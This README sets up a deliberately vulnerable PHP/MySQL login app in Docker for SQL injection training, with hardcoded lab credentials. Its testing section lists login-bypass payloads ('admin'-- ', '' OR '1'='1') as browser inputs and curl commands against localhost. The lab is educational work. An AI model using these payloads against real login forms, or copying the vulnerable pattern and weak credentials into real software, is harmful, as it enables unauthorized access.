# 🐳 Docker Setup for Vulnerable Web Application

## 📋 Overview

This Docker setup creates a complete environment for testing SQL injection vulnerabilities in a PHP web application with MySQL database.

## 🚀 Quick Start

```bash
# Build and start all containers
docker compose up -d --build

# Check container status
docker compose ps
```

## 🌐 Access Points

After starting, you can access:

- **Vulnerable Web App**: http://localhost:8080
- **phpMyAdmin**: http://localhost:8081
- **MySQL Database**: localhost:3306

## 🔐 Database Credentials

- **Host**: db (within Docker network) or localhost:3306
- **Username**: root
- **Password**: rootpassword
- **Database**: vulnerable_app

## 🧪 Testing SQL Injection

### Method 1: Using Browser
1. Open http://localhost:8080
2. Try these login combinations:

**Working SQL Injections:**
- Username: `admin'-- ` (with space after --)
  Password: anything
  
- Username: `' OR '1'='1`
  Password: anything

**Valid Credentials:**
- Username: `admin`
- Password: `admin123`

### Method 2: Using cURL

```bash
# SQL Injection with comment
curl -X POST -d "username=admin'-- &password=anything" http://localhost:8080/

# SQL Injection with OR condition
curl -X POST -d "username=' OR '1'='1&password=anything" http://localhost:8080/

# Valid login
curl -X POST -d "username=admin&password=admin123" http://localhost:8080/
```

## 📊 Database Schema

The application contains these tables:

**users table:**
- id (INT, Primary Key)
- username (VARCHAR)
- password (VARCHAR) 
- email (VARCHAR)
- created_at (TIMESTAMP)

**Sample users:**
- admin / admin123
- user1 / password1
- test / test123
- guest / guest123

## 🔍 phpMyAdmin Access

1. Go to http://localhost:8081
2. Login with:
   - Server: db
   - Username: root
   - Password: rootpassword
3. Browse the `vulnerable_app` database

## 🛠️ Container Services

### Web Container (PHP + Apache)
- PHP 8.1 with Apache
- MySQLi extension enabled
- Runs on port 8080
- Mounts local files for development

### Database Container (MySQL 5.7)
- MySQL 5.7 server
- Auto-creates database on startup
- Imports schema and sample data
- Runs on port 3306

### phpMyAdmin Container
- Web-based database management
- Links to database container
- Runs on port 8081

## 📁 Project Structure

```
vulnerable-webapp/
├── Dockerfile              # PHP+Apache container definition
├── docker-compose.yml       # Multi-container orchestration
├── index.php              # Vulnerable login application
├── database.sql           # Database schema and sample data
├── DOCKER_README.md      # This file
└── README.md            # Original project documentation
```

## 🐛 Common Issues & Solutions

### Connection Issues
If you get "Connection refused", wait 30 seconds for database to fully initialize:
```bash
docker compose logs db
```

### Port Conflicts
If ports are in use, change them in docker-compose.yml:
```yaml
ports:
  - "8080:80"   # Change 8080 to another port
```

### Permissions Issues
Ensure files have correct permissions:
```bash
sudo chown -R www-data:www-data .
sudo chmod -R 755 .
```

## 🛑 Stopping Services

```bash
# Stop all containers
docker compose down

# Stop and remove volumes (deletes database data)
docker compose down -v
```

## 🔄 Development Workflow

1. **Make changes to PHP files**
2. **Containers auto-reload changes** (due to volume mounts)
3. **Test in browser immediately**
4. **Access database via phpMyAdmin** if needed

## 🚨 Security Notice

⚠️ **This application contains intentional security vulnerabilities for educational purposes only.**

- **NEVER** deploy this code to production environments
- **ONLY** use on isolated development/test systems
- **ALWAYS** follow responsible disclosure practices

## 📚 Learning Objectives

After using this environment, you'll understand:

1. **How SQL injection attacks work**
2. **The danger of unsanitized input**
3. **Why prepared statements are essential**
4. **How to detect SQL injection vulnerabilities**
5. **Safe coding practices to prevent attacks**

## 🛡️ Secure Alternative

The fix for this vulnerability involves:
- **Prepared statements** (parameterized queries)
- **Input validation and sanitization**
- **Proper error handling**
- **Password hashing with bcrypt**

---

**Remember**: With great power comes great responsibility. Use these skills ethically! 🎓